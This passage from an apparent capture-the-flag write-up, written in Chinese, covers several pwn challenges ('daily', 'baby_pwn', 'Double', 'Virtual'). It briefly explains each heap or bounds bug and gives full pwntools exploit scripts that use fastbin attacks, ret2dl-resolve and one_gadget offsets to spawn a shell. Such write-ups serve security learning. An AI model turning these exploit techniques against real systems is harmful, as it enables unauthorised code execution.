class="string">&#x27;now value(hex) &#x27;</span>)</span><br><span class="line">    recv = <span class="string">&#x27;0x&#x27;</span> + p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input new value\n&#x27;</span>, str(num))</span><br><span class="line">    <span class="keyword">return</span> int(recv, <span class="number">16</span>)    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    BIN_PATH = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">    DEBUG = <span class="number">0</span></span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">    <span class="comment">#context.arch = &#x27;i386&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        p = process(BIN_PATH)</span><br><span class="line">        elf = ELF(BIN_PATH)</span><br><span class="line">        <span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">        context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> context.arch == <span class="string">&#x27;amd64&#x27;</span>:</span><br><span class="line">            libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line">        elf = ELF(BIN_PATH)</span><br><span class="line">        libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">        <span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        raw_input()</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;name:&#x27;</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line">    libc_addr = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        libc_addr.append(do_one(p, <span class="number">0x7ffc0ffeae68</span> + i - (<span class="number">0x7ffc0ffead40</span> - <span class="number">0x150</span>)))</span><br><span class="line"></span><br><span class="line">    start_addr = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">print</span> hex(libc_addr[i])</span><br><span class="line">        start_addr += (libc_addr[i] &amp; <span class="number">0xff</span>) &lt;&lt; (i * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    libc.address = start_addr - (<span class="number">0x7fad3b311830</span> - <span class="number">0x00007fad3b2f1000</span>)   </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">41</span><span class="number">-6</span><span class="number">-6</span>):</span><br><span class="line">        do_one(p, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> hex(libc.address + <span class="number">0xf1147</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">print</span> hex(((libc.address + <span class="number">0xf1147</span>) &gt;&gt; (i * <span class="number">8</span>)) &amp; <span class="number">0xff</span>)</span><br><span class="line">        write_one(p, <span class="number">0x7ffeb2b1b148</span> + i - (<span class="number">0x7ffeb2b1b140</span> - <span class="number">0x150</span>), ((libc.address + <span class="number">0xf1147</span>) &gt;&gt; (i * <span class="number">8</span>)) &amp; <span class="number">0xff</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> hex(libc.address)</span><br><span class="line">    p.interactive()</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="daily"><a href="#daily" class="headerlink" title="daily"></a>daily</h2><p>申请chunk的时候没有清空，导致地址泄漏。<br><code>free</code>的时候没有对数组越界进行检查，在获得堆地址后，可以计算偏移直接越界并进行<code>fastbin attack</code>（在堆中特定位置写入要<code>double free</code>的chunk的地址）。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">p, size, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>, str(<span class="number">2</span>))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;length of daily:&#x27;</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;you daily\n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">p</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>, str(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">p, idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>, str(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Please enter the index of daily:&#x27;</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">p, idx, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>, str(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Please enter the index of daily:&#x27;</span>, str(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Please enter the new daily\n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    BIN_PATH = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">    DEBUG = <span class="number">0</span></span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">    <span class="comment">#context.arch = &#x27;i386&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        p = process(BIN_PATH)</span><br><span class="line">        elf = ELF(BIN_PATH)</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> context.arch == <span class="string">&#x27;amd64&#x27;</span>:</span><br><span class="line">            libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line">        elf = ELF(BIN_PATH)</span><br><span class="line">        libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">        <span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">    add(p, <span class="number">0x100</span>, <span class="string">&#x27;sunichi&#x27;</span>) <span class="comment">#0</span></span><br><span class="line">    add(p, <span class="number">0x68</span>, <span class="string">&#x27;sunichi&#x27;</span>)  <span class="comment">#1</span></span><br><span class="line">    add(p, <span class="number">0x68</span>, <span class="string">&#x27;sunichi&#x27;</span>)  <span class="comment">#2</span></span><br><span class="line">    add(p, <span class="number">0x68</span>, <span class="string">&#x27;sunichi&#x27;</span>)  <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">    delete(p, <span class="number">0</span>)</span><br><span class="line">    add(p, <span class="number">0x100</span>, <span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">    show(p)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;0 : &#x27;</span>)</span><br><span class="line">    recv = p.recv(<span class="number">6</span>) + <span class="string">&#x27;\x00\x00&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        libc.address = u64(recv) - (<span class="number">0x00007f2a09751b73</span> - <span class="number">0x00007f2a0938d000</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        libc.address = u64(recv) - (<span class="number">0x00007f2a09751b73</span> - <span class="number">0x00007f2a0938d000</span>)</span><br><span class="line"></span><br><span class="line">    delete(p, <span class="number">1</span>)</span><br><span class="line">    delete(p, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    add(p, <span class="number">0x68</span>, <span class="string">&#x27;s&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">    show(p)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;1 : &#x27;</span>)</span><br><span class="line">    recv = p.recvuntil(<span class="string">&#x27;3 : &#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    recv = recv.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    heap_base = u64(recv) - (<span class="number">0x0000000001bba173</span> - <span class="number">0x1bba000</span>)</span><br><span class="line">    change(p, <span class="number">1</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> * <span class="number">3</span> + p64(heap_base + <span class="number">0x120</span>))</span><br><span class="line">    delete(p, <span class="number">1</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p, gdbscript=&#x27;b *0x400c39&#x27;)</span></span><br><span class="line">    <span class="comment">#raw_input()</span></span><br><span class="line">    delete(p, (heap_base + <span class="number">0x1a0</span> - <span class="number">0x602060</span>) / <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">    add(p, <span class="number">0x68</span>, p64(libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x13</span>))</span><br><span class="line">    add(p, <span class="number">0x68</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    add(p, <span class="number">0x68</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    add(p, <span class="number">0x68</span>, <span class="string">&#x27;\x00\x00\x00&#x27;</span> + p64(libc.address + <span class="number">0xf02a4</span>))</span><br><span class="line"></span><br><span class="line">    delete(p, <span class="number">1</span>)</span><br><span class="line">    delete(p, <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> hex(libc.address)</span><br><span class="line">    <span class="keyword">print</span> hex(heap_base)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="baby-pwn"><a href="#baby-pwn" class="headerlink" title="baby_pwn"></a>baby_pwn</h2><p>32位典型的ret2dl-resolve的题目，改改以前脚本的参数就行了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    BIN_PATH = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">    DEBUG = <span class="number">0</span></span><br><span class="line">    <span class="comment">#context.arch = &#x27;amd64&#x27;</span></span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        p = process(BIN_PATH)</span><br><span class="line">        elf = ELF(BIN_PATH)</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> context.arch == <span class="string">&#x27;amd64&#x27;</span>:</span><br><span class="line">            libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line">        elf = ELF(BIN_PATH)</span><br><span class="line">        libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        raw_input()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    offset = <span class="number">44</span></span><br><span class="line">    ppp_ret = <span class="number">0x080485d9</span></span><br><span class="line">    pop_ebp_ret = <span class="number">0x080485db</span></span><br><span class="line">    leave_ret = <span class="number">0x08048448</span></span><br><span class="line">    stack_size = <span class="number">0x800</span></span><br><span class="line">    bss_addr = <span class="number">0x0804a040</span></span><br><span class="line">    base_stage = bss_addr + stack_size</span><br><span class="line"></span><br><span class="line">    read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;A&#x27;</span> * offset</span><br><span class="line">    payload += p32(read_plt)</span><br><span class="line">    payload += p32(ppp_ret)</span><br><span class="line">    payload += p32(<span class="number">0</span>)</span><br><span class="line">    payload += p32(base_stage)</span><br><span class="line">    payload += p32(<span class="number">100</span>)</span><br><span class="line">    payload += p32(pop_ebp_ret)</span><br><span class="line">    payload += p32(base_stage)</span><br><span class="line">    payload += p32(leave_ret)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line">    cmd = <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line"></span><br><span class="line">    plt_0 = <span class="number">0x08048380</span> <span class="comment"># objdump -d -j .plt bof</span></span><br><span class="line">    rel_plt = <span class="number">0x804833c</span> <span class="comment"># objdump -s -j .rel.plt bof</span></span><br><span class="line"></span><br><span class="line">    index_offset = (base_stage + <span class="number">28</span>) - rel_plt</span><br><span class="line">    alarm_got = elf.got[<span class="string">&#x27;alarm&#x27;</span>]</span><br><span class="line">    dynsym = <span class="number">0x080481DC</span></span><br><span class="line">    dynstr = <span class="number">0x0804827C</span></span><br><span class="line"></span><br><span class="line">    fake_sym_addr = base_stage + <span class="number">36</span></span><br><span class="line">    align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">    fake_sym_addr = fake_sym_addr + align</span><br><span class="line">    index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span></span><br><span class="line">    r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">    fake_reloc = p32(alarm_got) + p32(r_info)</span><br><span class="line">    st_name = (fake_sym_addr + <span class="number">16</span>) - dynstr</span><br><span class="line">    fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)    </span><br><span class="line"></span><br><span class="line">    payload2 = <span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line">    payload2 += p32(plt_0)</span><br><span class="line">    payload2 += p32(index_offset)</span><br><span class="line">    payload2 += <span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line">    payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">    payload2 += <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">    payload2 += <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">    payload2 += fake_reloc <span class="comment"># (base_stage+28)的位置</span></span><br><span class="line">    payload2 += <span class="string">&#x27;B&#x27;</span> * align</span><br><span class="line">    payload2 += fake_sym <span class="comment"># (base_stage+36)的位置</span></span><br><span class="line">    payload2 += <span class="string">&quot;system\x00&quot;</span></span><br><span class="line">    payload2 += <span class="string">&#x27;A&#x27;</span> * (<span class="number">80</span> - len(payload2))</span><br><span class="line">    payload2 += cmd + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">    payload2 += <span class="string">&#x27;A&#x27;</span> * (<span class="number">100</span> - len(payload2))</span><br><span class="line">    p.send(payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x080485db : pop ebp ; ret</span></span><br><span class="line"><span class="string">0x080485d8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line"><span class="string">0x0804837d : pop ebx ; ret</span></span><br><span class="line"><span class="string">0x080485da : pop edi ; pop ebp ; ret</span></span><br><span class="line"><span class="string">0x080485d9 : pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line"><span class="string">0x080481ab : ret</span></span><br><span class="line"><span class="string">0x0804845e : ret 0xeac1</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="Double"><a href="#Double" class="headerlink" title="Double"></a>Double</h2><p>对于连续的相同的内容，程序不会重新申请新的chunk而是共用，但<code>free</code>的时候并没有检查是否还有<code>info</code>在使用，导致uaf。通过<code>fastbin attack</code>即可信息泄露和<code>getshell</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">p, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, str(<span class="number">1</span>))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Your data:\n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">p, idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, str(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Info index: &#x27;</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">p, idx, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, str(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Info index: &#x27;</span>, str(idx))</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">p, idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, str(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Info index: &#x27;</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    BIN_PATH = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">    DEBUG = <span class="number">0</span></span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        p = process(BIN_PATH)</span><br><span class="line">        elf = ELF(BIN_PATH)</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> context.arch == <span class="string">&#x27;amd64&#x27;</span>:</span><br><span class="line">            libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line">        elf = ELF(BIN_PATH)</span><br><span class="line">        libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">        <span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">    add(p, <span class="string">&#x27;a&#x27;</span> * (<span class="number">0xff</span>) + <span class="string">&#x27;\n&#x27;</span>) <span class="comment">#0</span></span><br><span class="line">    add(p, <span class="string">&#x27;a&#x27;</span> * (<span class="number">0xff</span>) + <span class="string">&#x27;\n&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">    delete(p, <span class="number">0</span>)</span><br><span class="line">    show(p, <span class="number">1</span>)</span><br><span class="line">    recv = p.recv(<span class="number">6</span>) + <span class="string">&#x27;\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">    libc.address = u64(recv) - (<span class="number">0x7fece5e8eb78</span> - <span class="number">0x00007fece5aca000</span>)</span><br><span class="line"></span><br><span class="line">    add(p, <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x67</span>) + <span class="string">&#x27;\n&#x27;</span>) <span class="comment">#2</span></span><br><span class="line">    add(p, <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x67</span>) + <span class="string">&#x27;\n&#x27;</span>) <span class="comment">#3</span></span><br><span class="line">    add(p, <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x1f</span>) + <span class="string">&#x27;\n&#x27;</span>) <span class="comment">#4</span></span><br><span class="line">    add(p, <span class="string">&#x27;b&#x27;</span> * (<span class="number">0x67</span>) + <span class="string">&#x27;\n&#x27;</span>) <span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">    delete(p, <span class="number">2</span>)</span><br><span class="line">    delete(p, <span class="number">5</span>)</span><br><span class="line">    delete(p, <span class="number">3</span>)</span><br><span class="line">    payload = p64(libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x13</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x67</span>, <span class="string">&#x27;a&#x27;</span>) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    add(p, payload)</span><br><span class="line">    add(p, <span class="string">&#x27;c&#x27;</span> * (<span class="number">0x67</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    add(p, <span class="string">&#x27;d&#x27;</span> * (<span class="number">0x67</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    add(p, <span class="string">&#x27;e&#x27;</span> * (<span class="number">0x47</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    add(p, <span class="string">&#x27;e&#x27;</span> * (<span class="number">0x47</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">3</span> + p64(libc.address + <span class="number">0xf1147</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x67</span>, <span class="string">&#x27;a&#x27;</span>) + <span class="string">&#x27;\n&#x27;</span>    </span><br><span class="line">    add(p, payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> hex(libc.address)</span><br><span class="line">    delete(p, <span class="number">8</span>)</span><br><span class="line">    delete(p, <span class="number">9</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="bms"><a href="#bms" class="headerlink" title="bms"></a>bms</h2><p>tcache，UAF，修改<code>stdout</code>来泄漏地址，劫持<code>free@got</code>。舍友做的，就不贴脚本了。</p>
<h2 id="Virtual"><a href="#Virtual" class="headerlink" title="Virtual"></a>Virtual</h2><p>在<code>save</code>和<code>load</code>的时候没有检查操作数是否导致地址越界，从而能够前后向任意偏移<code>save</code>和<code>load</code>。通过<code>save</code>将用户输入<code>stack data</code>的数据结构的指针指到<code>free@got</code>后，先打远程，通过泄漏的地址可以获取libc的版本。<br>然后用同样思路，只不过多一步操作（push add pop）将<code>free@got</code>的内容修改为<code>one_gadget</code>。<br>输入的时候多输入一个数据使得<code>free@got</code>处的数据能够被push。</p>
